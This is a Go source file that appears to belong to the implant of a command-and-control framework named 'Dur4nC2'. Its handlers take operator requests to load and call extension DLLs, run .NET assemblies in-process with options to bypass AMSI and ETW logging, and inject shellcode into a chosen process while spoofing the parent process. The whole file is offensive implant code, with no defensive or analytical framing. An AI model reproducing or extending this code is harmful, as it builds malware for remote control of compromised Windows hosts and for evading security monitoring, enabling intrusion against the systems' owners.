package handlers

import (
	"Dur4nC2/implant/modules/executions"
	"Dur4nC2/implant/modules/extension"
	"Dur4nC2/misc/protobuf/commonpb"
	"Dur4nC2/misc/protobuf/implantpb"
	"fmt"
	"google.golang.org/protobuf/proto"
)

// *** Extensions ***
func registerExtensionHandler(envelopeReq *implantpb.Envelope) *implantpb.Envelope {
	fmt.Println("[implant] Executing RegisterExtensionHandler")
	registerReq := &implantpb.RegisterExtensionReq{}
	err := proto.Unmarshal(envelopeReq.Data, registerReq)
	envelopeResp := &implantpb.Envelope{}
	registerResp := &implantpb.RegisterExtensionResp{Response: &commonpb.Response{}}
	if err != nil {
		registerResp.Response.Err = err.Error()
	} else {
		ext := extension.NewWindowsExtension(registerReq.Data, registerReq.Name, registerReq.OS, registerReq.Init)
		err = ext.Load()
		if err != nil {
			registerResp.Response.Err = err.Error()
		} else {
			extension.Add(ext)
		}

		registerResp.Response.BeaconID = registerReq.Request.BeaconID
		data, _ := proto.Marshal(registerResp)
		envelopeResp = &implantpb.Envelope{
			ID:   envelopeReq.ID,
			Type: implantpb.MsgRegisterExtensionResp,
			Data: data,
		}
	}

	return envelopeResp
}
func callExtensionHandler(envelopeReq *implantpb.Envelope) *implantpb.Envelope {
	fmt.Println("[implant] Executing CallExtensionHandler")
	callReq := &implantpb.CallExtensionReq{}
	err := proto.Unmarshal(envelopeReq.Data, callReq)
	if err != nil {
		return nil
	}

	callResp := &implantpb.CallExtensionResp{Response: &commonpb.Response{}}
	envelopeResp := &implantpb.Envelope{}
	gotOutput := false
	err = extension.Run(callReq.Name, callReq.Export, callReq.Args, func(out []byte) {
		gotOutput = true
		callResp.Output = out
		fmt.Println(string(out))
		data, _ := proto.Marshal(callResp)
		envelopeResp = &implantpb.Envelope{
			ID:   envelopeReq.ID,
			Type: implantpb.MsgCallExtensionResp,
			Data: data,
		}
	})
	// Only send back synchronously if there was an error
	if err != nil || !gotOutput {
		if err != nil {
			callResp.Response.Err = err.Error()
		}
		data, _ := proto.Marshal(callResp)
		envelopeResp = &implantpb.Envelope{
			ID:   envelopeReq.ID,
			Type: implantpb.MsgCallExtensionResp,
			Data: data,
		}
	}
	return envelopeResp
}
func listExtensionsHandler(envelopeReq *implantpb.Envelope) *implantpb.Envelope {
	lstReq := &implantpb.ListExtensionsReq{}
	err := proto.Unmarshal(envelopeReq.Data, lstReq)
	if err != nil {
		return nil
	}

	exts := extension.List()
	lstResp := &implantpb.ListExtensionsResp{
		Response: &commonpb.Response{},
		Names:    exts,
	}
	data, err := proto.Marshal(lstResp)
	envelopeResp := &implantpb.Envelope{
		ID:   envelopeReq.ID,
		Type: implantpb.MsgListExtensionResp,
		Data: data,
	}
	return envelopeResp
}

// *** Exec ***
func executeAssemblyHandler(envelopeReq *implantpb.Envelope) *implantpb.Envelope {
	fmt.Println("[implant] Executing executeAssemblyHanlder")
	executeAssemblyReq := &implantpb.ExecuteAssemblyReq{}
	err := proto.Unmarshal(envelopeReq.Data, executeAssemblyReq)
	if err != nil {
		return nil
	}
	assemblyStr, err := executions.InProcExecuteAssembly(
		executeAssemblyReq.Assembly,
		executeAssemblyReq.AssemblyArgs,
		executeAssemblyReq.Runtime,
		executeAssemblyReq.AmsiBypass,
		executeAssemblyReq.EtwBypass,
	)
	if err != nil {
		return nil
	}
	executeAssemblyResp := &implantpb.ExecuteAssemblyResp{
		Output: []byte(assemblyStr),
		Response: &commonpb.Response{
			BeaconID: executeAssemblyReq.Request.BeaconID,
		},
	}
	data, err := proto.Marshal(executeAssemblyResp)
	if err != nil {
		return nil
	}
	envelopeResp := &implantpb.Envelope{
		ID:   envelopeReq.ID,
		Type: implantpb.MsgExecuteAssemblyResp,
		Data: data,
	}
	return envelopeResp
}
func executeShellcodeHandler(envelopeReq *implantpb.Envelope) *implantpb.Envelope {
	fmt.Println("[implant] Executing executeShellcodeHandler")
	executeShellcodeReq := &implantpb.ExecuteShellcodeReq{}
	err := proto.Unmarshal(envelopeReq.Data, executeShellcodeReq)
	if err != nil {
		return &implantpb.Envelope{
			ID:                 envelopeReq.ID,
			UnknownMessageType: true,
		}
	}
	executions.RunShellcode(executeShellcodeReq.InjectionTechnique, executeShellcodeReq.Shellcode, executeShellcodeReq.Pid, executeShellcodeReq.SpoofedParentProcessName, executeShellcodeReq.MockProgramPath)
	executeShellcodeResp := &implantpb.ExecuteShellcodeResp{
		Output: []byte("Shellcode executed"),
		Response: &commonpb.Response{
			BeaconID: executeShellcodeReq.Request.BeaconID,
		},
	}
	data, err := proto.Marshal(executeShellcodeResp)
	if err != nil {
		fmt.Println("[implant] proto error")
		return &implantpb.Envelope{
			ID:                 envelopeReq.ID,
			UnknownMessageType: true,
		}
	}
	envelopeResp := &implantpb.Envelope{
		ID:   envelopeReq.ID,
		Type: implantpb.MsgExecuteShellcodeResp,
		Data: data,
	}
	return envelopeResp
}
